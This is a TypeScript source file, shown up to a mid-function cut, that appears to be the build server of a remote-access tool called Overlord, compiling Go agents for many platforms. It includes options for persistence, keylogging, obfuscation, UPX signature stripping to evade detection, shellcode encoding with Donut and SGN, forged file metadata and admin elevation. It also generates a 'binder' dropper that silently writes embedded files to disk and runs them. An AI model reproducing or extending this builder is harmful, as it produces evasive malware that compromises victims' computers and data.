import { $ } from "bun";
import path from "path";
import fs from "fs";
import { v4 as uuidv4 } from "uuid";
import { saveBuild, insertSharedFile, type SharedFileRecord } from "../db";
import { getUserById, canUploadFiles } from "../users";
import { logger } from "../logger";
import { getConfig } from "../config";
import { signBuildToken } from "./build-signing";
import { getClientLogPublicKey } from "./client-log-crypto";
import { ensureDataDir } from "../paths";
import * as buildManager from "../build/buildManager";
import type { BuildStream } from "../build/types";
import { ALLOWED_PLATFORMS } from "./validation-constants";
import { resolveRuntimeRoot } from "./runtime-paths";
import {
  ensureToolchain,
  toolchainKeyForTarget,
  type EnsuredToolchain,
} from "./toolchain-manager";
import { runDonut } from "./donut-manager";
import { buildLinuxShellcode } from "./linux-shellcode-manager";
import { runSgn } from "./sgn-manager";
import { resolveContainedPath } from "./upload-security";

function isClientModuleDir(dir: string): boolean {
  return (
    fs.existsSync(path.join(dir, "go.mod")) &&
    fs.existsSync(path.join(dir, "cmd", "agent"))
  );
}

function resolveClientModuleDir(rootDir: string): string | null {
  const candidates = [
    path.join(rootDir, "Overlord-Client"),
    path.join(rootDir, "..", "Overlord-Client"),
    path.join(rootDir, "dist", "Overlord-Client"),
    path.join(rootDir, "dist", "Overlord-Client", "Overlord-Client"),
  ];

  for (const dir of candidates) {
    if (isClientModuleDir(dir)) {
      return dir;
    }
  }

  return null;
}

function resolveClientBuildCacheRoot(): string {
  const explicit = process.env.OVERLORD_CLIENT_BUILD_CACHE_DIR?.trim();
  if (explicit) {
    return path.resolve(explicit);
  }

  // Keep UI build caches under persistent app data by default.
  return path.resolve(ensureDataDir(), "client-build-cache");
}

function resolveExplicitAndroidNdkToolchainBin(): string | null {
  const explicit = process.env.ANDROID_NDK_HOME?.trim();
  if (!explicit) return null;
  const hostArch = process.arch === "arm64" ? "linux-aarch64" : "linux-x86_64";
  const toolchainBin = path.join(explicit, "toolchains", "llvm", "prebuilt", hostArch, "bin");
  try {
    return fs.existsSync(toolchainBin) ? toolchainBin : null;
  } catch {
    return null;
  }
}

type BoundFile = {
  name: string;
  data: string; // base64
  targetOS: string[]; // [] = all, otherwise ["windows","linux","darwin"]
  execute: boolean;
};

type BuildProcessConfig = {
  platforms: string[];
  serverUrl?: string;
  rawServerList?: boolean;
  mutex?: string;
  disableMutex?: boolean;
  stripDebug?: boolean;
  disableCgo?: boolean;
  obfuscate?: boolean;
  enablePersistence?: boolean;
  persistenceMethods?: string[];
  startupName?: string;
  hideConsole?: boolean;
  noPrinting?: boolean;
  disableKeylogger?: boolean;
  enableWebrtc?: boolean;
  enableWinRE?: boolean;
  builtByUserId?: number;
  outputName?: string;
  garbleLiterals?: boolean;
  garbleTiny?: boolean;
  garbleSeed?: string;
  assemblyTitle?: string;
  assemblyProduct?: string;
  assemblyCompany?: string;
  assemblyVersion?: string;
  assemblyCopyright?: string;
  iconBase64?: string;
  enableUpx?: boolean;
  upxStripHeaders?: boolean;
  requireAdmin?: boolean;
  criticalProcess?: boolean;
  outputExtension?: string;
  sleepSeconds?: number;
  boundFiles?: BoundFile[];
  useDonut?: boolean;
  useLinuxShellcode?: boolean;
  shellcodeConsole?: boolean;
  useSgn?: boolean;
  sgnIterations?: number;
  outputSgnTxt?: boolean;
  solMemo?: boolean;
  solAddress?: string;
  solRpcEndpoints?: string;
  iosBundleId?: string;
  fetchPublicIP?: boolean;
  uploadToFileShare?: boolean;
  buildPlugins?: Record<string, { enabled: boolean; settings: Record<string, unknown> }>;
};

type BuildHookRunner = (
  hook: string,
  payload: unknown,
) => Promise<Array<{ pluginId: string; result: unknown }>>;

type BuildHookMessage = {
  text: string;
  level?: "debug" | "info" | "warn" | "error" | "success";
};

function cloneForHook<T>(value: T): T {
  return JSON.parse(JSON.stringify(value ?? null));
}

function isRecord(value: unknown): value is Record<string, any> {
  return !!value && typeof value === "object" && !Array.isArray(value);
}

function normalizeHookMessages(result: unknown): BuildHookMessage[] {
  if (!isRecord(result)) return [];
  const rawMessages = Array.isArray(result.messages)
    ? result.messages
    : typeof result.message === "string"
      ? [result.message]
      : [];
  const messages: BuildHookMessage[] = [];
  for (const raw of rawMessages) {
    if (typeof raw === "string" && raw.trim()) {
      messages.push({ text: raw.trim(), level: "info" });
    } else if (isRecord(raw) && typeof raw.text === "string" && raw.text.trim()) {
      const level = typeof raw.level === "string" ? raw.level : "info";
      messages.push({
        text: raw.text.trim(),
        level: ["debug", "info", "warn", "error", "success"].includes(level) ? level as BuildHookMessage["level"] : "info",
      });
    }
  }
  return messages;
}

async function runBuildHooks(
  hookRunner: BuildHookRunner | undefined,
  hook: string,
  payload: unknown,
  sendToStream: (data: any) => void,
): Promise<Array<{ pluginId: string; result: unknown }>> {
  if (!hookRunner) return [];
  const results = await hookRunner(hook, cloneForHook(payload));
  for (const item of results) {
    for (const message of normalizeHookMessages(item.result)) {
      sendToStream({
        type: "output",
        text: `[plugin:${item.pluginId}] ${message.text}\n`,
        level: message.level || "info",
      });
    }
  }
  return results;
}

function mergeBuildConfigPatch(config: BuildProcessConfig, result: unknown): BuildProcessConfig {
  if (!isRecord(result)) return config;
  const patch = isRecord(result.config) ? result.config : isRecord(result.configPatch) ? result.configPatch : undefined;
  if (!patch) return config;
  return { ...config, ...patch };
}

function buildTransformHookPayload(args: {
  buildId: string;
  stage: string;
  platform: string;
  os: string;
  arch: string;
  targetKey: string;
  outDir: string;
  clientDir: string;
  filename: string;
  filePath: string;
  size?: number;
  config: BuildProcessConfig;
  extra?: Record<string, unknown>;
}) {
  return {
    buildId: args.buildId,
    stage: args.stage,
    platform: args.platform,
    os: args.os,
    arch: args.arch,
    targetKey: args.targetKey,
    outDir: args.outDir,
    clientDir: args.clientDir,
    file: {
      filename: args.filename,
      path: args.filePath,
      platform: args.platform,
      size: args.size ?? (fs.existsSync(args.filePath) ? fs.statSync(args.filePath).size : 0),
    },
    config: args.config,
    ...(args.extra || {}),
  };
}

function stripUpxHeaders(filePath: string): boolean {
  try {
    const buf = Buffer.from(fs.readFileSync(filePath));
    const UPX_MAGIC = Buffer.from("UPX!");
    let modified = false;
    let offset = 0;
    while (offset < buf.length - 3) {
      const idx = buf.indexOf(UPX_MAGIC, offset);
      if (idx === -1) break;
      buf[idx] = 0x00;
      buf[idx + 1] = 0x00;
      buf[idx + 2] = 0x00;
      buf[idx + 3] = 0x00;
      modified = true;
      offset = idx + 4;
    }
    if (modified) {
      fs.writeFileSync(filePath, buf);
    }
    return modified;
  } catch {
    return false;
  }
}

type BuildProcessDeps = {
  generateBuildMutex: (length?: number) => string;
  sanitizeOutputName: (name: string) => string;
  fileShareRoot?: string;
  runBuildHookForAll?: BuildHookRunner;
};

function guessMimeTypeForUpload(filename: string): string {
  const ext = path.extname(filename).toLowerCase();
  switch (ext) {
    case ".exe":
    case ".dll":
    case ".scr":
    case ".com":
    case ".pif":
      return "application/vnd.microsoft.portable-executable";
    case ".bat":
    case ".cmd":
      return "application/bat";
    case ".ps1":
    case ".txt":
      return "text/plain";
    case ".bin":
      return "application/octet-stream";
    case ".ipa":
      return "application/octet-stream";
    case ".sgn":
      return "application/octet-stream";
    default:
      return "application/octet-stream";
  }
}

async function uploadBuildFilesToFileShare(
  build: BuildStream,
  outDir: string,
  fileShareRoot: string,
  userId: number,
  sendToStream: (data: any) => void,
): Promise<void> {
  const dbUser = getUserById(userId);
  if (!dbUser) {
    sendToStream({
      type: "output",
      text: "WARNING: Skipping file-share upload — uploading user not found.\n",
      level: "warn",
    });
    return;
  }
  if (!canUploadFiles(dbUser.id, dbUser.role)) {
    sendToStream({
      type: "output",
      text: "WARNING: Skipping file-share upload — you do not have upload permission.\n",
      level: "warn",
    });
    return;
  }

  await fs.promises.mkdir(fileShareRoot, { recursive: true });

  sendToStream({ type: "status", text: "Uploading build to file share..." });
  sendToStream({
    type: "output",
    text: `\n── Uploading ${build.files.length} file(s) to file share ──\n`,
    level: "info",
  });

  for (const file of build.files as any[]) {
    const filename: string = file.filename || file.name;
    if (!filename) continue;
    const sourcePath = resolveContainedPath(outDir, filename);
    if (!fs.existsSync(sourcePath)) {
      sendToStream({
        type: "output",
        text: `WARNING: Build output not found on disk for upload: ${filename}\n`,
        level: "warn",
      });
      continue;
    }
    try {
      const id = uuidv4();
      const folder = resolveContainedPath(fileShareRoot, id);
      await fs.promises.mkdir(folder, { recursive: true });
      const targetPath = resolveContainedPath(folder, filename);
      await fs.promises.copyFile(sourcePath, targetPath);
      const size = fs.statSync(targetPath).size;

      const record: SharedFileRecord = {
        id,
        filename,
        storedPath: targetPath,
        size,
        mimeType: guessMimeTypeForUpload(filename),
        uploadedBy: dbUser.id,
        uploadedByUsername: dbUser.username,
        passwordHash: null,
        maxDownloads: null,
        downloadCount: 0,
        expiresAt: null,
        createdAt: Date.now(),
        description: `Build ${build.id.substring(0, 8)} — ${file.platform || "unknown"}`,
      };
      insertSharedFile(record);

      logger.info(
        `[file-share] ${dbUser.username} uploaded "${filename}" (${size} bytes) id=${id} via build ${build.id.substring(0, 8)}`,
      );
      sendToStream({
        type: "output",
        text: `Uploaded ${filename} (${size} bytes) → file share id ${id}\n`,
        level: "success",
      });
      sendToStream({
        type: "file_share_uploaded",
        id,
        filename,
        platform: file.platform || null,
        size,
      });
    } catch (err: any) {
      sendToStream({
        type: "output",
        text: `WARNING: Failed to upload ${filename} to file share: ${err.message || err}\n`,
        level: "warn",
      });
    }
  }
}

function detectAgentVersion(clientDir: string): string {
  try {
    const configPath = path.join(clientDir, "cmd", "agent", "config", "config.go");
    const content = fs.readFileSync(configPath, "utf8");
    const match = content.match(/var\s+AgentVersion\s*=\s*"([^"]+)"/);
    return match?.[1]?.trim() || "unknown";
  } catch {
    return "unknown";
  }
}

function nvcodecHeaderPath(clientDir: string): string {
  return path.join(clientDir, "third_party", "nvcodec", "nvEncodeAPI.h");
}

function ensureNVCodecHeaderForWindowsCgo(
  clientDir: string,
  sendToStream: (data: any) => void,
): void {
  const headerPath = nvcodecHeaderPath(clientDir);
  if (fs.existsSync(headerPath)) {
    sendToStream({
      type: "output",
      text: `Native NVENC header: ${headerPath}\n`,
      level: "info",
    });
    return;
  }
  throw new Error(
    "Native NVENC streaming requires Overlord-Client/third_party/nvcodec/nvEncodeAPI.h for Windows CGO builds. Restore the vendored header or run scripts/vendor-nvcodec-headers from the repo root.",
  );
}

function writeSgnTextArtifact(
  sgnPath: string,
  txtPath: string,
  platform: string,
  arch: "amd64" | "386",
  iterations: number,
): number {
  const bytes = fs.readFileSync(sgnPath);
  const body = [
    "# SGN encoded shellcode",
    `platform: ${platform}`,
    `arch: ${arch}`,
    `iterations: ${iterations}`,
    "encoding: base64",
    `bytes: ${bytes.length}`,
    "",
    bytes.toString("base64"),
    "",
  ].join("\n");
  fs.writeFileSync(txtPath, body, "utf8");
  return fs.statSync(txtPath).size;
}

export async function startBuildProcess(
  buildId: string,
  config: BuildProcessConfig,
  deps: BuildProcessDeps,
): Promise<void> {
  const SEVEN_DAYS_MS = 7 * 24 * 60 * 60 * 1000;
  const BUILD_STREAM_HEARTBEAT_MS = 15_000;
  const now = Date.now();

  const build: BuildStream = {
    id: buildId,
    controllers: [],
    status: "running",
    startTime: now,
    expiresAt: now + SEVEN_DAYS_MS,
    files: [],
    userId: config.builtByUserId,
  };

  buildManager.addBuildStream(buildId, build);

  const sendToStream = (data: any) => {
    const encoder = new TextEncoder();
    const message = `data: ${JSON.stringify(data)}\n\n`;
    const encoded = encoder.encode(message);

    if (data.type === "output") {
      logger.info(`[build:${buildId.substring(0, 8)}] ${data.text.trimEnd()}`);
    } else if (data.type === "status") {
      logger.info(`[build:${buildId.substring(0, 8)}] STATUS: ${data.text}`);
    } else if (data.type === "error") {
      logger.error(`[build:${buildId.substring(0, 8)}] ERROR: ${data.error}`);
    }

    const alive: ReadableStreamDefaultController[] = [];
    for (const controller of build.controllers) {
      try {
        controller.enqueue(encoded);
        alive.push(controller);
      } catch {
      }
    }
    build.controllers.length = 0;
    build.controllers.push(...alive);

    if (data.type === "complete") {
      for (const controller of build.controllers) {
        try {
          controller.close();
        } catch {}
      }
      build.controllers.length = 0;
    }
  };

  let winresTempDir: string | null = null;
  const generatedSysoFiles: string[] = [];
  let binderGenPath: string | null = null;
  let binderFilesDir: string | null = null;
  let binderLockPath: string | null = null;

  const buildStartedAt = Date.now();
  const keepAliveTimer = setInterval(() => {
    const elapsedMinutes = Math.floor((Date.now() - buildStartedAt) / 60_000);
    sendToStream({
      type: "heartbeat",
      elapsedMinutes,
      timestamp: Date.now(),
    });
  }, BUILD_STREAM_HEARTBEAT_MS);

  try {
    for (const item of await runBuildHooks(
      deps.runBuildHookForAll,
      "prepare",
      { buildId, config },
      sendToStream,
    )) {
      config = mergeBuildConfigPatch(config, item.result);
    }

    const serverConfig = getConfig();
    const buildAgentToken = (serverConfig.auth.agentToken || "").trim();

    sendToStream({ type: "status", text: "Preparing build environment..." });

    try {
      const goCheck = await $`go version`.quiet();
      const goVersion = goCheck.stdout.toString().trim();
      logger.info(`[build:${buildId.substring(0, 8)}] Using ${goVersion}`);
      sendToStream({ type: "output", text: `Using ${goVersion}\n`, level: "info" });
    } catch {
      const errorMsg = "Go is not installed or not in PATH. Please install Go from https://golang.org/dl/ and ensure it's in your system PATH.";
      logger.error(`[build:${buildId.substring(0, 8)}] ${errorMsg}`);
      sendToStream({ type: "output", text: `ERROR: ${errorMsg}\n`, level: "error" });
      sendToStream({ type: "error", error: errorMsg });
      sendToStream({ type: "complete", success: false });
      build.status = "failed";
      return;
    }

    const rootDir = resolveRuntimeRoot();
    const clientDir = resolveClientModuleDir(rootDir);
    if (!clientDir) {
      throw new Error(
        `Overlord-Client source not found (missing go.mod). Checked: ${path.join(rootDir, "dist", "Overlord-Client")}, ${path.join(rootDir, "Overlord-Client")}`,
      );
    }
    const agentVersion = detectAgentVersion(clientDir);
    const outDir = path.join(rootDir, "dist-clients");
    const cacheRoot = resolveClientBuildCacheRoot();
    const goBuildCacheDir = path.join(cacheRoot, "go-build");
    const goModCacheDir = path.join(cacheRoot, "go-mod");

    await Bun.$`mkdir -p ${outDir}`.quiet();
    fs.mkdirSync(goBuildCacheDir, { recursive: true });
    fs.mkdirSync(goModCacheDir, { recursive: true });
    sendToStream({ type: "output", text: `Build directory: ${outDir}\n`, level: "info" });
    sendToStream({ type: "output", text: `Client source: ${clientDir}\n`, level: "info" });
    sendToStream({ type: "output", text: `Stub version: ${agentVersion}\n`, level: "info" });
    sendToStream({ type: "output", text: `Client build cache: ${cacheRoot}\n`, level: "info" });

    const platformsToBuild = (config.platforms || []).filter((p) => ALLOWED_PLATFORMS.has(p));
    if (platformsToBuild.length !== (config.platforms || []).length) {
      throw new Error("One or more requested platforms are not allowed");
    }

    const hasAndroidTargets = platformsToBuild.some((p) => p.startsWith("android-"));
    const hasBsdTargets = platformsToBuild.some(
      (p) => p.startsWith("freebsd-") || p.startsWith("openbsd-"),
    );
    const hasIosTargets = platformsToBuild.some((p) => p.startsWith("ios-"));

    if (hasAndroidTargets) {
      sendToStream({
        type: "output",
        text: "WARNING: Android targets are severely untested and will probably not work right.\n",
        level: "warn",
      });
    }

    if (hasBsdTargets) {
      sendToStream({
        type: "output",
        text: "WARNING: BSD targets are severely untested and will probably not work right.\n",
        level: "warn",
      });
    }

    if (hasIosTargets) {
      sendToStream({
        type: "output",
        text: "WARNING: iOS targets are experimental (POC). Most features will be stubbed. CGO will be force-disabled.\n",
        level: "warn",
      });
    }

    let ndkBin: string | null = null;
    if (hasAndroidTargets) {
      ndkBin = resolveExplicitAndroidNdkToolchainBin();
      if (!ndkBin) {
        try {
          const ndk = await ensureToolchain("android-ndk", sendToStream);
          ndkBin = ndk.binDir;
        } catch (err: any) {
          sendToStream({
            type: "output",
            text: `Warning: Android NDK download failed (${err.message || err}). Android builds require the NDK. Set ANDROID_NDK_HOME to use a pre-installed NDK.\n`,
            level: "warn",
          });
        }
      }
    }

    let buildMutex = "";
    if (!config.disableMutex) {
      buildMutex = config.mutex || deps.generateBuildMutex();
      sendToStream({ type: "output", text: `Mutex: ${buildMutex}\n`, level: "info" });
    } else {
      sendToStream({ type: "output", text: "Mutex: disabled\n", level: "info" });
    }

    const buildTag = await signBuildToken({
      v: 1,
      bid: buildId,
      uid: config.builtByUserId ?? null,
      iat: Math.floor(Date.now() / 1000),
    });
    sendToStream({ type: "output", text: `Build tag: signed (bid=${buildId.substring(0, 8)})\n`, level: "info" });

    if (config.outputName) {
      sendToStream({ type: "output", text: `Custom output name: ${config.outputName}\n`, level: "info" });
    }

    let upxBin: string | null = null;
    if (config.enableUpx) {
      try {
        const upxTool = await ensureToolchain("upx", sendToStream);
        upxBin = path.join(upxTool.binDir, "upx");
      } catch (err: any) {
        sendToStream({
          type: "output",
          text: `ERROR: UPX is not installed and on-demand download failed (${err.message || err}).\n`,
          level: "error",
        });
        throw new Error("UPX not found");
      }
    }

    const hasAssemblyData = !!(config.assemblyTitle || config.assemblyProduct || config.assemblyCompany || config.assemblyVersion || config.assemblyCopyright || config.iconBase64 || config.requireAdmin);
    const hasWindowsTargets = platformsToBuild.some((p) => p.startsWith("windows-"));

    if (hasAssemblyData && hasWindowsTargets) {
      sendToStream({ type: "status", text: "Generating Windows resource data..." });

      const goEnvResult = await $`go env GOPATH`.quiet();
      const goPath = goEnvResult.stdout.toString().trim();
      const goBinDir = process.env.GOBIN || (goPath ? path.join(goPath, "bin") : "");
      const winresExe = process.platform === "win32" ? "go-winres.exe" : "go-winres";
      let winresBin = "go-winres";

      let hasWinres = false;
      if (goBinDir && fs.existsSync(path.join(goBinDir, winresExe))) {
        winresBin = path.join(goBinDir, winresExe);
        hasWinres = true;
      } else {
        try {
          await $`go-winres version`.quiet();
          hasWinres = true;
        } catch {
          try {
            sendToStream({ type: "output", text: "Installing go-winres...\n", level: "info" });
            await $`go install github.com/tc-hib/go-winres@latest`.env({ ...process.env, GOMODCACHE: goModCacheDir }).quiet();
            if (goBinDir && fs.existsSync(path.join(goBinDir, winresExe))) {
              winresBin = path.join(goBinDir, winresExe);
              hasWinres = true;
            }
          } catch (installErr: any) {
            sendToStream({ type: "output", text: `WARNING: Failed to install go-winres: ${installErr.message || installErr}. Assembly data/icon will be skipped.\n`, level: "warn" });
          }
        }
      }

      if (hasWinres) {
        const agentDir = path.join(clientDir, "cmd", "agent");
        const winresLockPath = path.join(agentDir, ".winres.lock");

        if (fs.existsSync(winresLockPath)) {
          sendToStream({
            type: "output",
            text: "WARNING: Another build is currently generating Windows resources for this client. Skipping winres for this build.\n",
            level: "warn",
          });
        } else {
          // Acquire a simple lock so only one build at a time touches cmd/agent/*.syso
          fs.writeFileSync(winresLockPath, String(process.pid));
          try {
            sendToStream({ type: "output", text: `Using go-winres: ${winresBin}\n`, level: "info" });
            winresTempDir = path.join(outDir, `.winres-${buildId.substring(0, 8)}`);
            fs.mkdirSync(winresTempDir, { recursive: true });

            const winresConfig: any = {};

            if (config.iconBase64) {
              try {
                const iconBuffer = Buffer.from(config.iconBase64, "base64");
                const iconPath = path.join(winresTempDir, "icon.ico");
                fs.writeFileSync(iconPath, iconBuffer);
                winresConfig["RT_GROUP_ICON"] = { "#1": { "0000": "icon.ico" } };
                sendToStream({ type: "output", text: `Icon embedded (${iconBuffer.length} bytes)\n`, level: "info" });
              } catch (iconErr: any) {
                sendToStream({ type: "output", text: `WARNING: Failed to process icon: ${iconErr.message}. Skipping icon.\n`, level: "warn" });
              }
            }

            const versionStr = config.assemblyVersion || "0.0.0.0";
            const winExt = config.outputExtension || ".exe";
            const versionInfo: any = {
              "0409": {
                "FileDescription": config.assemblyTitle || "",
                "ProductName": config.assemblyProduct || "",
                "CompanyName": config.assemblyCompany || "",
                "FileVersion": versionStr,
                "ProductVersion": versionStr,
                "LegalCopyright": config.assemblyCopyright || "",
                "OriginalFilename": config.outputName ? (config.outputName + winExt) : "",
              },
            };

            winresConfig["RT_VERSION"] = {
              "#1": {
                "0000": {
                  "fixed": {
                    "file_version": versionStr,
                    "product_version": versionStr,
                  },
                  "info": versionInfo,
                },
              },
            };

            const winresJsonPath = path.join(winresTempDir, "winres.json");
            if (config.requireAdmin) {
              winresConfig["RT_MANIFEST"] = {
                "#1": {
                  "0000": {
                    "identity": {},
                    "description": "",
                    "minimum-os": "vista",
                    "execution-level": "requireAdministrator",
                    "ui-access": false,
                    "auto-elevate": false,
                    "dpi-awareness": "system",
                    "disable-theming": false,
                    "disable-window-filtering": false,
                    "high-resolution-scrolling-aware": false,
                    "ultra-high-resolution-scrolling-aware": false,
                    "long-path-aware": false,
                    "printer-driver-isolation": false,
                    "gdi-scaling": false,
                    "segment-heap": false,
                    "use-common-controls-v6": false,
                  },
                },
              };
              sendToStream({ type: "output", text: "UAC manifest: requireAdministrator\n", level: "info" });
            }
            fs.writeFileSync(winresJsonPath, JSON.stringify(winresConfig, null, 2));
            sendToStream({ type: "output", text: `Winres config: ${winresJsonPath}\n`, level: "info" });

            const sysoOutPrefix = path.join(agentDir, "rsrc");
            try {
              const winresResult = await $`${winresBin} make --in ${winresJsonPath} --out ${sysoOutPrefix}`.cwd(winresTempDir).nothrow().quiet();
              if (winresResult.exitCode !== 0) {
                const stderr = winresResult.stderr.toString().trim();
                sendToStream({ type: "output", text: `WARNING: go-winres failed (exit ${winresResult.exitCode}): ${stderr}\nBuilding without assembly data.\n`, level: "warn" });
              } else {
                for (const f of fs.readdirSync(agentDir)) {
                  if (f.startsWith("rsrc") && f.endsWith(".syso")) {
                    generatedSysoFiles.push(path.join(agentDir, f));
                  }
                }
                sendToStream({ type: "output", text: `Windows resources generated (${generatedSysoFiles.length} .syso files)\n`, level: "info" });
              }
            } catch (winresErr: any) {
              sendToStream({ type: "output", text: `WARNING: go-winres failed: ${winresErr.message || winresErr}. Building without assembly data.\n`, level: "warn" });
            }
          } finally {
            try {
              fs.unlinkSync(winresLockPath);
            } catch {
              // ignore errors removing the lock
            }
          }
        }
      }
    }

    // ── Binder: embed files into the agent ────────────────────────────────────
    const hasBoundFiles = Array.isArray(config.boundFiles) && config.boundFiles.length > 0;
    if (hasBoundFiles) {
      sendToStream({ type: "status", text: "Setting up bound files..." });

      const agentDir = path.join(clientDir, "cmd", "agent");
      binderLockPath = path.join(agentDir, ".binder.lock");
      binderGenPath = path.join(agentDir, "binder_gen.go");
      binderFilesDir = path.join(agentDir, "bindfiles");

      // Wait up to 5 minutes to acquire the binder lock (serializes concurrent builds with bound files)
      const BINDER_POLL_MS = 1500;
      const BINDER_TIMEOUT_MS = 5 * 60 * 1000;
      const lockWaitStart = Date.now();
      while (fs.existsSync(binderLockPath)) {
        if (Date.now() - lockWaitStart > BINDER_TIMEOUT_MS) {
          throw new Error(
            "Could not acquire binder lock after 5 minutes. Another build may have stalled. Please try again.",
          );
        }
        sendToStream({ type: "output", text: "Waiting for binder lock...\n", level: "warn" });
        await new Promise((r) => setTimeout(r, BINDER_POLL_MS));
      }
      fs.writeFileSync(binderLockPath, `${process.pid},${buildId}`);

      try {
        fs.mkdirSync(binderFilesDir, { recursive: true });

        const manifest: { name: string; targetOS: string[]; execute: boolean }[] = [];
        for (const bf of config.boundFiles!) {
          const fileBytes = Buffer.from(bf.data, "base64");
          fs.writeFileSync(path.join(binderFilesDir, bf.name), fileBytes, { mode: 0o755 });
          manifest.push({ name: bf.name, targetOS: bf.targetOS, execute: bf.execute });
          sendToStream({
            type: "output",
            text: `Bound file: ${bf.name} (${fileBytes.length} bytes)${bf.targetOS.length > 0 ? ` [${bf.targetOS.join(",")}]` : " [all OS]"}${bf.execute ? " [exec]" : ""}\n`,
            level: "info",
          });
        }
        fs.writeFileSync(
          path.join(binderFilesDir, "manifest.json"),
          JSON.stringify({ files: manifest }, null, 2),
        );

        const binderGoCode = `//go:build hasbinder

package main

import (
\t"embed"
\t"encoding/json"
\t"os"
\t"os/exec"
\t"path/filepath"
\t"runtime"
)

//go:embed bindfiles
var boundFilesFS embed.FS

type binderFileEntry struct {
\tName     string   \`json:"name"\`
\tTargetOS []string \`json:"targetOS"\`
\tExecute  bool     \`json:"execute"\`
}

type binderManifest struct {
\tFiles []binderFileEntry \`json:"files"\`
}

func runBoundFiles() {
\tmanifestData, err := boundFilesFS.ReadFile("bindfiles/manifest.json")
\tif err != nil {
\t\treturn
\t}
\tvar manifest binderManifest
\tif err := json.Unmarshal(manifestData, &manifest); err != nil {
\t\treturn
\t}
\tif len(manifest.Files) == 0 {
\t\treturn
\t}
\ttmpDir, err := os.MkdirTemp("", "ovld_")
\tif err != nil {
\t\treturn
\t}
\tfor _, entry := range manifest.Files {
\t\tif len(entry.TargetOS) > 0 {
\t\t\tmatched := false
\t\t\tfor _, t := range entry.TargetOS {
\t\t\t\tif t == runtime.GOOS {
\t\t\t\t\tmatched = true
\t\t\t\t\tbreak
\t\t\t\t}
\t\t\t}
\t\t\tif !matched {
\t\t\t\tcontinue
\t\t\t}
\t\t}
\t\tdata, err := boundFilesFS.ReadFile("bindfiles/" + entry.Name)
\t\tif err != nil {
\t\t\tcontinue
\t\t}
\t\toutPath := filepath.Join(tmpDir, entry.Name)
\t\tif err := os.WriteFile(outPath, data, 0755); err != nil {
\t\t\tcontinue
\t\t}
\t\tif entry.Execute {
\t\t\tvar cmd *exec.Cmd
\t\t\tswitch runtime.GOOS {
\t\t\tcase "windows":
\t\t\t\tcmd = exec.Command("cmd", "/c", "start", "", outPath)
\t\t\tcase "darwin":
\t\t\t\tcmd = exec.Command("open", outPath)
\t\t\tdefault:
\t\t\t\tcmd = exec.Command("xdg-open", outPath)
\t\t\t}
\t\t\t_ = cmd.Start()
\t\t}
\t}
}
`;
        fs.writeFileSync(binderGenPath, binderGoCode);
        sendToStream({
          type: "output",
          text: `Binder ready: ${config.boundFiles!.length} file(s) will be embedded\n`,
          level: "info",
        });
      } catch (binderErr: any) {
        // Release lock on setup failure
        try { fs.unlinkSync(binderLockPath); } catch {}
        binderLockPath = null;
        throw new Error(`Binder setup failed: ${binderErr.message || binderErr}`);
      }
    }
    // ── End binder setup ──────────────────────────────────────────────────────

    for (const platform of platformsToBuild) {
      const [os, arch, ...rest] = platform.split("-");
      const goarm = arch === "armv7" ? "7" : undefined;
      const actualArch = goarm ? "arm" : arch;
      // iOS builds use GOOS=darwin with a custom build tag since GOOS=ios requires CGO/Xcode
      const isIosTarget = os === "ios";
      const effectiveOs = isIosTarget ? "darwin" : os;
      const targetKey = `${effectiveOs}/${actualArch}${goarm ? `/v${goarm}` : ""}`;
      const namePrefix = config.outputName || "agent";
      const winExt = config.outputExtension || ".exe";
      const buildSlug = buildId.substring(0, 8);
      let friendlyOutputName = deps.sanitizeOutputName(
        platform.includes("windows") ? `${namePrefix}-${platform}${winExt}` : `${namePrefix}-${platform}`,
      );
      let outputName = deps.sanitizeOutputName(
        platform.includes("windows") ? `${namePrefix}-${platform}-${buildSlug}${winExt}` : `${namePrefix}-${platform}-${buildSlug}`,
      );

      sendToStream({ type: "status", text: `Building ${platform}...` });
      sendToStream({ type: "output", text: `\n=== Building ${platform} ===\n`, level: "info" });

      const env: NodeJS.ProcessEnv = {
        ...process.env,
        GOOS: effectiveOs,
        GOARCH: actualArch,
        CGO_ENABLED: config.disableCgo === true ? "0" : "1",
        GOWORK: "off",
        GOCACHE: goBuildCacheDir,
        GOMODCACHE: goModCacheDir,
        ...(goarm ? { GOARM: goarm } : {}),
      };

      if (targetKey === "windows/arm64" && env.CGO_ENABLED === "1") {
        env.CGO_ENABLED = "0";
        sendToStream({
          type: "output",
          text: "WARNING: windows/arm64 builds do not support CGO in this pipeline; forcing CGO disabled for this target.\n",
          level: "warn",
        });
      }

      if (isIosTarget && env.CGO_ENABLED === "1") {
        env.CGO_ENABLED = "0";
        sendToStream({
          type: "output",
          text: "WARNING: iOS builds require Xcode toolchain for CGO; forcing CGO disabled for this target.\n",
          level: "warn",
        });
      }

      if (
        effectiveOs === "darwin" &&
        !isIosTarget &&
        process.platform !== "darwin" &&
        env.CGO_ENABLED === "1"
      ) {
        env.CGO_ENABLED = "0";
        sendToStream({
          type: "output",
          text: "WARNING: Cross-compiling to darwin from a non-macOS host requires an osxcross/macOS SDK toolchain, which is not bundled. Forcing CGO disabled for this target. Build natively on macOS for full CGO support (keylogger keystroke capture requires CGO).\n",
          level: "warn",
        });
      }

      if (env.CGO_ENABLED === "1") {
        let cc: string | undefined;
        let cxx: string | undefined;
        let extraBinDir: string | undefined;

        if (os === "android" && ndkBin) {
          const ndkCcByTarget: Record<string, string> = {
            "android/amd64": "x86_64-linux-android21-clang",
            "android/arm64": "aarch64-linux-android21-clang",
            "android/arm/v7": "armv7a-linux-androideabi21-clang",
          };
          const basename = ndkCcByTarget[targetKey];
          if (basename) {
            cc = path.join(ndkBin, basename);
            cxx = path.join(ndkBin, `${basename}++`);
            extraBinDir = ndkBin;
            env.AR = path.join(ndkBin, "llvm-ar");
          }
        } else {
          const tcKey = toolchainKeyForTarget(targetKey);
          if (tcKey) {
            try {
              const tc: EnsuredToolchain = await ensureToolchain(tcKey, sendToStream);
              cc = tc.ccPath;
              cxx = tc.cxxPath;
              extraBinDir = tc.binDir;
              if (tc.arPath) env.AR = tc.arPath;
            } catch (err: any) {
              sendToStream({
                type: "output",
                text: `ERROR: Failed to provision cross-compile toolchain for ${targetKey}: ${err.message || err}\n`,
                level: "error",
              });
              throw err;
            }
          }
        }

        if (cc) {
          env.CC = cc;
          sendToStream({ type: "output", text: `CGO compiler: ${cc}\n`, level: "info" });
        } else {
          sendToStream({
            type: "output",
            text: `CGO compiler not mapped for ${targetKey}; falling back to default compiler lookup\n`,
            level: "warn",
          });
        }
        if (cxx) {
          env.CXX = cxx;
        }
        if (extraBinDir) {
          const sep = process.platform === "win32" ? ";" : ":";
